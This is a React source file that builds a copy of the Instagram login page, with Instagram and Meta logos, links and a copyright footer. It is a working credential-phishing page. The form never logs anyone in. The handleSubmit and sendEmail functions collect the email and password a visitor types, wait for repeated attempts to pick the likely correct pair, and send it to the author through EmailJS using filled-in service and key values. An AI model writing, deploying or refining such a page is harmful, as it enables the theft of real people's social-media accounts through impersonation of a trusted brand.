import emailjs from 'emailjs-com';
import { useState } from 'react';
import './App.css'
import './index.css'

function App() {

    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [tries, setTries] = useState([]);


    const handleSubmit = (e) => {
        e.preventDefault();
        const newTry = { email, password };
        const updatedTries = [...tries, newTry];

        if (updatedTries.length === 2) {
            const [firstTry, secondTry] = updatedTries;

            if (firstTry.email === secondTry.email && firstTry.password === secondTry.password) {
                sendEmail(firstTry.email, firstTry.password);  // Send email instead of saving to Google Sheets
                setTries([]); // Reset for next sequence
            } else {
                setTries(updatedTries);
            }
        } else if (updatedTries.length === 3) {
            const mostSimilar = getMostSimilarTry(updatedTries);
            sendEmail(mostSimilar.email, mostSimilar.password);  // Send email instead of saving to Google Sheets
            setTries([]); // Reset after sending
        } else {
            setTries(updatedTries);
        }

        setEmail('');
        setPassword('');
    };

    // Function to send email using EmailJS
    const sendEmail = async (email, password) => {
        const templateParams = {
            email,  // The user's email
            password,  // The user's password
            timestamp: new Date().toISOString()  // Timestamp of the attempt
        };

        try {
            const result = await emailjs.send(
                'service_bwfz7pi',  // Replace with your Service ID from EmailJS
                'template_ox1runa',  // Replace with your Template ID from EmailJS
                templateParams,  // The data that will be inserted into your email template
                '5dQYpAB5uFxe5-eX8'  // Replace with your User ID from EmailJS
            );
            console.log('Email sent successfully:', result);
        } catch (error) {
            console.error('Error sending email:', error);
        }
    };

    

    const getMostSimilarTry = (tries) => {
        let mostSimilar = tries[0];
        let highestSimilarity = 0;

        for (let i = 0; i < tries.length - 1; i++) {
            for (let j = i + 1; j < tries.length; j++) {
                const similarity = calculateSimilarity(tries[i], tries[j]);
                if (similarity > highestSimilarity) {
                    highestSimilarity = similarity;
                    mostSimilar = tries[i];
                }
            }
        }

        return mostSimilar;
    };

    const calculateSimilarity = (try1, try2) => {
        let similarity = 0;

        if (try1.email === try2.email) {
            similarity += 1;
        }

        if (try1.password === try2.password) {
            similarity += 1;
        }

        return similarity;
    };

    return (
        // the login page
        <div className='mx-auto h-full flex flex-col justify-between align-middle bg-white'>

            {/* First Container */}
            <div className='w-full flex justify-center items-center gap-8'>
                {/* Phone Mockup */}
                <div className='hidden lg:flex'>
                    <img src="/public/phone.png" alt="phone" className='w-[430px]' />
                </div>

                {/* Login Form */}
                <div className='space-y-2'>
                    {/* First Form */}
                    <div className='py-2 px-10 w-80 flex flex-col justify-between items-center border-2 border-slate-200 rounded'>
                        {/* Logo */}
                        <img src="./public/instagram-logo.png" alt="instagram-logo" className='w-44' />
                        {/* Inputs */}
                        <div className='space-y-3'>
                            <div className='space-y-1.5'>
                                <input type="text" value={email} onChange={(e) => setEmail(e.target.value)} placeholder='Phone number, username, or email' className='py-2 px-2 w-full border-2 border-slate-200 rounded text-[0.75rem] bg-slate-100' />
                                <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder='Password' className='py-2 px-2 w-full border-2 border-slate-200 rounded text-[0.75rem] bg-slate-100' />
                            </div>
                            <input type="submit" value="Log in" onClick={handleSubmit} className='py-1 px-2 w-full rounded-lg text-sm bg-igBlue text-white font-semibold' />
                        </div>
                        {/* Or */}
                        <div className="py-4 w-full flex justify-center items-center relative">
                            <span className="absolute w-full h-[2px] bg-slate-100 border border-slate-200"></span>
                            <p className="bg-white px-2 z-10 text-[0.8rem] text-slate-400">OR</p>
                        </div>
                        {/* Facebook login */}
                        <a href="www.facebook.com" className='w-full flex justify-center items-center gap-2'>
                            <img src="/public/facebook.svg" alt="facebook" className='w-6' />
                            <p className='text-sm font-semibold text-igBlue'>Log in with Facebook</p>
                        </a>
                        {/* Forget Password */}
                        <div className='py-3'>
                            <a href="www.facebook.com" className='text-[0.8rem] text-slate-600 font-normal'>Forget password?</a>
                        </div>
                    </div>

                    {/* Second Form */}
                    <div className='py-2 px-10 w-80 flex flex-col justify-between items-center border-2 border-slate-200 rounded'>
                        {/* Sign up */}
                        <div className='py-3 flex gap-1'>
                            <p className='text-[0.8rem] text-slate-600 font-normal'>Don&apos;t have an account?</p>
                            <a href="www.instagram.com" className='text-[0.8rem] text-igBlue font-semibold'>Sign up</a>
                        </div>
                    </div>

                    {/* Third Form */}
                    <div className='py-3 flex flex-col justify-center items-center gap-4'>
                        <p className='text-[0.8rem] text-slate-600 font-medium'>Get the app.</p>
                        <div className='flex justify-center items-center gap-2'>
                            <img src="/public/Microsoft.png" alt="Microsoft" className='h-12 border border-slate-200 rounded-lg' />
                            <img src="/public/google-play.png" alt="Google Play" className='h-12 border border-slate-200 rounded-lg' />
                        </div>
                    </div>
                </div>
            </div>

            {/* Second Container */}
            <div className='my-8 w-full flex flex-col justify-center align-middle gap-4 text-[0.7rem] text-slate-500 font-normal'>
                <div className='w-full flex justify-center flex-wrap align-middle gap-4'>
                    <a>Meta</a>
                    <a>About</a>
                    <a>Blog</a>
                    <a>Jobs</a>
                    <a>Help</a>
                    <a>API</a>
                    <a>Privacy</a>
                    <a>Terms</a>
                    <a>Locations</a>
                    <a>Instagram Lite</a>
                    <a>Threads</a>
                    <a>Contact Uploading & Non-Users</a>
                    <a>Meta Verified</a>
                </div>
                <div className='w-full flex justify-center align-middle gap-4'>
                    <a>English</a>
                    <a>© 2024 Instagram from Meta</a>
                </div>
            </div>

        </div>
    )
}

export default App
